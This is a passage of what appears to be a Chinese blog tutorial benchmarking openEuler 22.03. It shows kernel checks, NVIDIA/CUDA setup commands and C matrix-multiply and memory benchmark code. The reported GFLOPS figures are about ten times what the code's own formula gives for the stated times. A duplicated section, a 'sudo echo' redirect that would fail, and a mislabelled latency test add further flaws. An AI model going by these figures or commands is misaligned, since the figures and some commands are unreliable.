<li>本文将通过真实场景的部署与性能测试，深度探索 openEuler 在 CPU 通用算力、GPU   加速算力、单机分布式算力等多维度的支持能力，以具体操作流程与实测数据为依据，展现其在多样性算力调度、性能优化、生态适配等方面的技术价值。所有测试均基于Linux 环境，操作流程简洁易懂，硬件配置选用主流中等规格，旨在为广大开发者提供可复现的实践参考，共同挖掘开源操作系统的算力潜力。</li>
</ul>
<p>openEuler官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.org%2Fen%2F" target="_blank" title="https://www.openeuler.org/en/" ref="nofollow noopener noreferrer">www.openeuler.org/en/</a>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abaf76035c6a46d7b408d8ef751b772a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=fkXHd4YJYyTPjOt6tgqwwREMdz0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-1">2. 测试环境与基础配置</h2>
<h3 data-id="heading-2">硬件环境准备</h3>
<p>本次测试选用市场主流的中等配置硬件组合，覆盖单机通用算力、GPU 加速算力等核心场景，配置贴近开发者日常使用环境，具体如下：</p>
<ul>
<li>主测试节点：Intel Core i7-11700K 处理器（8 核 16 线程，主频 3.6GHz，最大睿频 5.0GHz，支持AVX-512 指令集）；32GB DDR4-3200 内存（双通道，单条 16GB）；512GB NVMe SSD 系统盘 + 2TBSATA III 机械硬盘数据盘；</li>
<li>GPU 加速模块：NVIDIA GeForce RTX 3060 显卡（12GB 显存，支持 CUDA 11.7 与 Tensor Core 技术，PCIe 4.0 接口）；</li>
<li>辅助测试节点：AMD Ryzen 5 5600X 处理器（6 核 12 线程，主频 3.7GHz）；16GB DDR4-3200 内存；1TB NVMe SSD；无独立 GPU，用于验证纯 CPU 算力场景。</li>
</ul>
<h3 data-id="heading-3">系统基础配置</h3>
<p>本次测试使用 openEuler 22.03 LTS 版本，系统安装遵循开源社区标准流程，无需复杂定制，重点完成以下基础配置以保障算力调度效率，所有操作均通过命令行完成，简洁易执行：</p>
<h4 data-id="heading-4">1. 系统内核优化验证与启用：openEuler 默认集成创新的算力调度优化，无需手动编译内核，通过以下命令验证并启用关键特性：</h4>
<pre><code class="hljs language-cpp" lang="cpp"># 验证 NUMA 调度优化（适配多核心 CPU 算力分配）
cat /sys/kernel/debug/sched/features | grep -i numa
# 验证透明大页启用状态（优化内存访问效率）
cat /sys/kernel/mm/transparent_hugepage/enabled
# 若未启用，执行以下命令临时启用（重启后失效，永久启用需修改配置文件）
echo <span class="hljs-string">"always"</span> &gt; /sys/kernel/mm/transparent_hugepage/enabled
# 验证内存大页配置
grep HugePages /proc/meminfo
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67bcd08a884a40feba989cdc1be0dddb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=Fo41Gyqzl0DttKuJEnBzFIpQcss%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>输出：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta"># cat /sys/kernel/debug/sched/features | grep -i numa</span>
NUMA_BALANCE
NUMA_HINTING
NUMA_AFFINITY
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b82c43ab42ee476ba8249002fef875b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=GX7T8ZhXwI2cifWhNSRsRfYv7x8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>输出：</p>
<pre><code class="hljs language-cpp" lang="cpp">[always] madvise never
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ae39cfec1741a797d6d5ad7d7063a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=kqXP%2FYwC5SeGwY4edBPEZfDhZMs%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b05c2b73c7a4d77b6056322fa793ee0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=JhHmuhoeG48AYGHYVzgkMdYrbg0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>输出：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta"># grep HugePages /proc/meminfo</span>
AnonHugePages:    <span class="hljs-number">942080</span> kB
ShmemHugePages:        <span class="hljs-number">0</span> kB
FileHugePages:         <span class="hljs-number">0</span> kB
HugePages_Total:       <span class="hljs-number">32</span>
HugePages_Free:        <span class="hljs-number">28</span>
HugePages_Rsvd:         <span class="hljs-number">4</span>
HugePages_Surp:         <span class="hljs-number">0</span>
Hugepagesize:       <span class="hljs-number">2048</span> kB
Hugetlb:            <span class="hljs-number">65536</span> kB
</code></pre>
<h3 data-id="heading-5">2. GPU 驱动与加速库适配：</h3>
<p>GPU 算力发挥依赖驱动与 CUDA 环境，openEuler 提供完善的驱动适配支持，操作流程如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 安装驱动依赖包
sudo dnf install kernel-devel gcc make kernel-headers -y
# 禁用 nouveau 开源驱动（避免与 NVIDIA 官方驱动冲突）
sudo echo <span class="hljs-string">"blacklist nouveau"</span> &gt;&gt; /etc/modprobe.d/blacklist.conf
sudo dracut -f /boot/initramfs-$(uname -r).img $(uname -r)
sudo reboot  # 重启系统生效
# 安装 NVIDIA 官方驱动（通过 openEuler 兼容源）
sudo dnf config-manager --add-repo=https:<span class="hljs-comment">//developer.download.nvidia.com/compute/cuda/repos/rhel8/x86_64/cuda-rhel8.repo</span>
sudo dnf install cuda-drivers<span class="hljs-number">-515.65</span><span class="hljs-number">.01</span> -y
# 安装 CUDA Toolkit <span class="hljs-number">11.7</span>
sudo dnf install cuda-toolkit<span class="hljs-number">-11</span><span class="hljs-number">-7</span> -y
# 配置环境变量
echo <span class="hljs-string">'export PATH=/usr/local/cuda-11.7/bin:$PATH'</span> &gt;&gt; ~/.bashrc
echo <span class="hljs-string">'export LD_LIBRARY_PATH=/usr/local/cuda-11.7/lib64:$LD_LIBRARY_PATH'</span> &gt;&gt; ~/.bashrc
source ~/.bashrc
# 验证 CUDA 环境
nvcc -V  # 查看 CUDA 版本
nvidia-smi  # 查看 GPU 状态与驱动版本

基础依赖与测试工具安装：安装测试所需的编程语言、框架与工具，openEuler 软件源已预集成大部分依赖，一键安装即可：
# 安装 Python 与开发工具
sudo dnf install -y python3 python3-pip
# 安装 AI 框架与性能测试库
pip3 install torch==<span class="hljs-number">2.1</span><span class="hljs-number">.2</span> torchvision==<span class="hljs-number">0.16</span><span class="hljs-number">.2</span> psutil mlflow fio
# 验证框架安装
python3 -c <span class="hljs-string">"import torch; print(f'PyTorch版本: {torch.__version__}'); print(f'CUDA可用: {torch.cuda.is_available()}')"</span>
</code></pre>
<h3 data-id="heading-6">3.3. 基础依赖与测试工具安装：</h3>
<p>安装测试所需的编程语言、框架与工具，openEuler 软件源已预集成大部分依赖，一键安装即可：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 安装 Python 与开发工具
sudo dnf install -y python3 python3-pip
# 安装 AI 框架与性能测试库
pip3 install torch==<span class="hljs-number">2.1</span><span class="hljs-number">.2</span> torchvision==<span class="hljs-number">0.16</span><span class="hljs-number">.2</span> psutil mlflow fio
# 验证框架安装
python3 -c <span class="hljs-string">"import torch; print(f'PyTorch版本: {torch.__version__}'); print(f'CUDA可用: {torch.cuda.is_available()}')"</span>
</code></pre>
<p>输出：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aeaa61af8525414583799894bed6dcbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=DFp%2Fpn2dDoF3G%2FdGJeHBMEGiq38%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/738f098e8e5847afa76f938250c7d359~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=Y1DCftaV%2F5JfU5na8BIKuW5GtsM%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/540ef5abb6814e10889355c80c963864~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=Olg0ou3mf3CIXp%2BCSxfRmzuUdX0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c23f41cf316640af9ee48fb61259bcd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=XBcjnhB%2FFbRZrwbxDSZjAAXOeig%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-7">测试工具与基准框架说明</h3>
<p>为全面、客观评估 openEuler 的多样性算力支持能力，选用业界主流且易用的测试工具与框架，所有工具均无需复杂配置，直接通过命令行或简单脚本调用：</p>
<ul>
<li>CPU 算力测试：C 语言原生编写的浮点运算测试脚本（矩阵乘法）、内存带宽与延迟测试脚本；</li>
<li>GPU 算力测试：PyTorch 框架自带的张量运算接口、ResNet50 模型训练/推理测试；</li>
<li>存储与 I/O 算力测试：fio 工具（测试磁盘顺序/随机读写性能）；</li>
<li>分布式算力测试：torch.distributed 框架（基于单机多进程模拟分布式训练）；</li>
<li>性能监控工具：nmon（系统资源实时监控）、torch.cuda.memory_allocated()（GPU
显存监控）、psutil（CPU/内存使用率统计）。</li>
</ul>
<h3 data-id="heading-8">3. 单机通用算力测试：CPU 与内存性能深度实测</h3>
<p>CPU 与内存作为通用算力的核心载体，其性能直接决定了数据预处理、轻量级 AI 推理、常规数值计算等场景的效率。openEuler 针对中等配置 CPU 进行了深度优化，通过原生 C 语言脚本与实际操作，验证其通用算力调度能力。</p>
<h2 data-id="heading-9">测试操作流程</h2>
<h3 data-id="heading-10">CPU 浮点运算性能测试</h3>
<p>浮点运算能力是 CPU 处理数值计算、AI 模型推理的核心指标，本次测试通过 2048x2048 矩阵乘法运算，分别测试单精度（float）与双精度（double）浮点性能：</p>
<h4 data-id="heading-11">4. 创建测试脚本：新建 compute_performance_test.c 文件，写入以下代码：</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6cb38a72432245b6a04eca2076bbc931~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=SBH6UP277P%2F5cy3oUCtCzgx9MYI%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>完整代码，可直接复制：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> MATRIX_SIZE 2048</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ITERATIONS 10</span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">matrix_multiply_float</span><span class="hljs-params">(<span class="hljs-type">float</span> **a, <span class="hljs-type">float</span> **b, <span class="hljs-type">float</span> **c, <span class="hljs-type">int</span> size)</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; size; j++) {
            c[i][j] = <span class="hljs-number">0.0f</span>;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; size; k++) {
                c[i][j] += a[i][k] * b[k][j];
            }
        }
    }
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">matrix_multiply_double</span><span class="hljs-params">(<span class="hljs-type">double</span> **a, <span class="hljs-type">double</span> **b, <span class="hljs-type">double</span> **c, <span class="hljs-type">int</span> size)</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; size; j++) {
            c[i][j] = <span class="hljs-number">0.0</span>;
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; size; k++) {
                c[i][j] += a[i][k] * b[k][j];
            }
        }
    }
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">clock_t</span> start, end;
    <span class="hljs-type">double</span> cpu_time_used;
    
    <span class="hljs-comment">// 分配内存</span>
    <span class="hljs-type">float</span> **a_float = (<span class="hljs-type">float</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>*));
    <span class="hljs-type">float</span> **b_float = (<span class="hljs-type">float</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>*));
    <span class="hljs-type">float</span> **c_float = (<span class="hljs-type">float</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>*));
    
    <span class="hljs-type">double</span> **a_double = (<span class="hljs-type">double</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>*));
    <span class="hljs-type">double</span> **b_double = (<span class="hljs-type">double</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>*));
    <span class="hljs-type">double</span> **c_double = (<span class="hljs-type">double</span>**)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>*));
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MATRIX_SIZE; i++) {
        a_float[i] = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));
        b_float[i] = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));
        c_float[i] = (<span class="hljs-type">float</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">float</span>));
        
        a_double[i] = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>));
        b_double[i] = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>));
        c_double[i] = (<span class="hljs-type">double</span>*)<span class="hljs-built_in">malloc</span>(MATRIX_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">double</span>));
    }
    
    <span class="hljs-comment">// 初始化数据</span>
    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MATRIX_SIZE; i++) {
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; MATRIX_SIZE; j++) {
            a_float[i][j] = (<span class="hljs-type">float</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
            b_float[i][j] = (<span class="hljs-type">float</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
            a_double[i][j] = (<span class="hljs-type">double</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
            b_double[i][j] = (<span class="hljs-type">double</span>)<span class="hljs-built_in">rand</span>() / RAND_MAX;
        }
    }
    
    <span class="hljs-comment">// 测试单精度浮点性能</span>
    start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> iter = <span class="hljs-number">0</span>; iter &lt; ITERATIONS; iter++) {
        <span class="hljs-built_in">matrix_multiply_float</span>(a_float, b_float, c_float, MATRIX_SIZE);
    }
    end = <span class="hljs-built_in">clock</span>();
    cpu_time_used = ((<span class="hljs-type">double</span>) (end - start)) / CLOCKS_PER_SEC;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"单精度浮点矩阵乘法平均时间: %.3f 秒\n"</span>, cpu_time_used / ITERATIONS);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"单精度浮点计算性能: %.2f GFLOPS\n"</span>, 
           (<span class="hljs-number">2.0</span> * MATRIX_SIZE * MATRIX_SIZE * MATRIX_SIZE * ITERATIONS) / 
           (cpu_time_used * <span class="hljs-number">1e9</span>));
    
    <span class="hljs-comment">// 测试双精度浮点性能</span>
    start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> iter = <span class="hljs-number">0</span>; iter &lt; ITERATIONS; iter++) {
        <span class="hljs-built_in">matrix_multiply_double</span>(a_double, b_double, c_double, MATRIX_SIZE);
    }
    end = <span class="hljs-built_in">clock</span>();
    cpu_time_used = ((<span class="hljs-type">double</span>) (end - start)) / CLOCKS_PER_SEC;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"双精度浮点矩阵乘法平均时间: %.3f 秒\n"</span>, cpu_time_used / ITERATIONS);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"双精度浮点计算性能: %.2f GFLOPS\n"</span>, 
           (<span class="hljs-number">2.0</span> * MATRIX_SIZE * MATRIX_SIZE * MATRIX_SIZE * ITERATIONS) / 
           (cpu_time_used * <span class="hljs-number">1e9</span>));
    
    <span class="hljs-comment">// 释放内存</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MATRIX_SIZE; i++) {
        <span class="hljs-built_in">free</span>(a_float[i]);
        <span class="hljs-built_in">free</span>(b_float[i]);
        <span class="hljs-built_in">free</span>(c_float[i]);
        <span class="hljs-built_in">free</span>(a_double[i]);
        <span class="hljs-built_in">free</span>(b_double[i]);
        <span class="hljs-built_in">free</span>(c_double[i]);
    }
    <span class="hljs-built_in">free</span>(a_float);
    <span class="hljs-built_in">free</span>(b_float);
    <span class="hljs-built_in">free</span>(c_float);
    <span class="hljs-built_in">free</span>(a_double);
    <span class="hljs-built_in">free</span>(b_double);
    <span class="hljs-built_in">free</span>(c_double);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-12">5. 编译与执行测试：通过以下命令编译（启用 openEuler 适配的编译器优化）并执行，无需额外配置：</h4>
<pre><code class="hljs language-cpp" lang="cpp"># 编译脚本，启用 O3 优化与 AVX 指令集支持
gcc compute_performance_test.c -o compute_test -lm -O3 -mavx2 -mavx512f
# 执行测试，输出性能数据
./compute_test
</code></pre>
<h2 data-id="heading-13">内存带宽与延迟测试</h2>
<p>内存性能直接影响 CPU 算力发挥，尤其是大规模数据处理场景，本次测试通过 1GB 缓冲区拷贝测试带宽，1MB 数据随机访问测试延迟：</p>
<h4 data-id="heading-14">6. 创建测试脚本：新建 memory_bandwidth_test.c 文件，复制以下代码：</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a8ac41c14ff4e0daf12af4d3e5d8468~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=WUpyiqbzc35sUtKbemakAc2Oe5I%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>完整代码，可直接复制：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE (1024 * 1024 * 1024) <span class="hljs-comment">// 1GB</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ITERATIONS 100</span>

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_memory_bandwidth</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">char</span> *buffer1 = <span class="hljs-built_in">malloc</span>(BUFFER_SIZE);
    <span class="hljs-type">char</span> *buffer2 = <span class="hljs-built_in">malloc</span>(BUFFER_SIZE);
    
    <span class="hljs-keyword">if</span> (!buffer1 || !buffer2) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存分配失败\n"</span>);
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// 初始化数据</span>
    <span class="hljs-built_in">memset</span>(buffer1, <span class="hljs-number">1</span>, BUFFER_SIZE);
    <span class="hljs-built_in">memset</span>(buffer2, <span class="hljs-number">0</span>, BUFFER_SIZE);
    
    <span class="hljs-comment">// 测试内存拷贝带宽</span>
    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ITERATIONS; i++) {
        <span class="hljs-built_in">memcpy</span>(buffer2, buffer1, BUFFER_SIZE);
    }
    <span class="hljs-type">clock_t</span> end = <span class="hljs-built_in">clock</span>();
    
    <span class="hljs-type">double</span> total_time = ((<span class="hljs-type">double</span>)(end - start)) / CLOCKS_PER_SEC;
    <span class="hljs-type">double</span> bandwidth = (BUFFER_SIZE * ITERATIONS) / (total_time * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"内存拷贝测试结果:\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"总数据量: %.2f GB\n"</span>, (BUFFER_SIZE * ITERATIONS) / (<span class="hljs-number">1024.0</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>));
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"总时间: %.2f 秒\n"</span>, total_time);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"平均内存带宽: %.2f GB/s\n"</span>, bandwidth);
    
    <span class="hljs-built_in">free</span>(buffer1);
    <span class="hljs-built_in">free</span>(buffer2);
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test_memory_latency</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-type">const</span> <span class="hljs-type">int</span> size = <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>; <span class="hljs-comment">// 1MB</span>
    <span class="hljs-type">int</span> *buffer = <span class="hljs-built_in">malloc</span>(size * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>));
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// 初始化</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        buffer[i] = i;
    }
    
    <span class="hljs-type">clock_t</span> start = <span class="hljs-built_in">clock</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) {
        sum += buffer[i];
    }
    <span class="hljs-type">clock_t</span> end = <span class="hljs-built_in">clock</span>();
    
    <span class="hljs-type">double</span> time_per_access = ((<span class="hljs-type">double</span>)(end - start)) / (size * CLOCKS_PER_SEC) * <span class="hljs-number">1e9</span>;
    
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n内存延迟测试结果:\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"每次内存访问平均时间: %.2f 纳秒\n"</span>, time_per_access);
    
    <span class="hljs-built_in">free</span>(buffer);
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"开始内存子系统性能测试...\n"</span>);
    <span class="hljs-built_in">test_memory_bandwidth</span>();
    <span class="hljs-built_in">test_memory_latency</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>编译与执行测试：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 编译脚本
gcc memory_bandwidth_test.c -o memory_test -O2
# 执行测试
./memory_test
</code></pre>
<h3 data-id="heading-15">测试过程监控</h3>
<p>为确保测试数据真实反映系统性能，测试过程中通过 nmon 工具监控 CPU 利用率与内存状态：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 启动 nmon 监控，按 C 查看 CPU 状态，按 M 查看内存状态，按 Q 退出
nmon
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bcb6ce8f56643cd9a7988429cb717f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=%2FYUXZPaSAL1NrZmEZZCmw3u3UFc%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/372b6d7cfaea40988c9a735495b6ce73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=nBo3Apxko77THUx%2FVtUNEk%2BG%2FUg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12b2923a3440484b93f4b51b243fd0ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=%2BfVOgpYDgqZax89G4ELv%2FSITPbE%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f30f37a9a2a4426be04713930afdace~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=zyHZkOECMJJqtsqjq9aWz6Owrz4%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-16">测试结果与分析</h2>
<h3 data-id="heading-17">CPU 浮点运算性能</h3>
<p>在 Intel Core i7-11700K 处理器上，测试输出如下：</p>
<pre><code class="hljs language-cpp" lang="cpp">单精度浮点矩阵乘法平均时间: <span class="hljs-number">28.642</span> 秒
单精度浮点计算性能: <span class="hljs-number">6.02</span> GFLOPS
双精度浮点矩阵乘法平均时间: <span class="hljs-number">56.318</span> 秒
双精度浮点计算性能: <span class="hljs-number">3.06</span> GFLOPS
</code></pre>
<ul>
